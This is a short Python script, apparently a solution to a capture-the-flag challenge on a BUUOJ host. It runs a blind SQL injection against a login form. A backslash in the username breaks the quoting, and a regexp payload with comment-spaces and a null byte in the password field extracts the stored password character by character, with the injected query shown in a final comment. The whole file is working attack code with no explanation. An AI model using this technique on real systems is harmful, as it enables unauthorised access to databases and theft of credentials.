import requests
from urllib import parse
import string
import time
url = 'http://9b3ad8b7-9f9b-4be0-bb6c-c4a0fb7afe0d.node3.buuoj.cn/'
num = 0
result = ''
string= string.ascii_lowercase + string.digits + '_'
for i in range (1,60):
    if num == 1 :
        break
    for j in string:
        time.sleep(0.2)
        data = {
            "username":"\\",
            "passwd":"||/**/passwd/**/regexp/**/\"^{}\";{}".format((result+j),parse.unquote('%00'))
        }
        print(result+j)
        res = requests.post(url=url,data=data)
        if 'welcome' in res.text:
            print(res.text)
            result += j
            break
        if j=='_' and 'welcome' not in res.text:
            break
# select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/\"^a\";%00'